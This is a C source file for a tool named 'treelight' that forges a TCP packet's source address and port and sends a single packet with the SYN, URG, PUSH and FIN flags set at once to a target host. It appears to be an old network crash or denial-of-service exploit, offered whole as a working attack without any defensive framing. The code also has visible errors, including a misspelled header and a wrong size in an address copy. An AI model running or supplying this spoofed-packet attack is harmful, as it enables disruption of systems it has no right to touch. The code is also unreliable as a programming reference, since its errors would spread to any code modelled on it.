#include <netdb.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <stdio.h>
#include <stlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/protocols.h>

#include "pktsend.h"

#define err(x) { fprintf(stderr, x); exit(1); }

unsigned long int

resolve(host)
char host[255];
{
    unsigned long int addr;
    struct hostent *he;
    if((he = gethostbyname(host)) == NULL){

	if((he = gethostbyaddr(host, strlen(host), AF_INET)) == NULL)

	    return -1;

    }

    bcopy(*(he->h_addr_list), &(addr), sizeof(he->h_addr_list));

    return(addr);

}

void main(argc, argv)
int argc; char **argv;
{
    unsigned long int saddr, daddr;
    unsigned short int sport, dport;
    struct sockaddr_in sin;
    int s;
    if(argc!=5)
	err("Usage: treelight source_address source_port dest_addr dest_port \n"
	    );

/* Resolve Addresses. */
    if((saddr=resolve(argv[1])) == -1)
	err("Unable to resolve source address.\n");
    if((daddr=resolve(argv[3])) == -1)
	err("Unable to resolve destination address.\n");

/* Convert port numbers to integers. */
    sport=(unsigned short int)atoi(argv[2]);
    dport=(unsigned short int)atoi(argv[4]);

/* Open raw socket. */
    if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
	err("Unable to open raw socket.\n");
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr= daddr;
    sin.sin_port = dport;
    if((sendpkt_tcp(&sin, s, "1", 1, saddr, daddr, sport, dport,
		    TH_SYN|TH_URG|TH_PUSH|TH_FIN, 2387283, 2387238)) == -1)
	err("Error sending our rad little packet.\n");
}
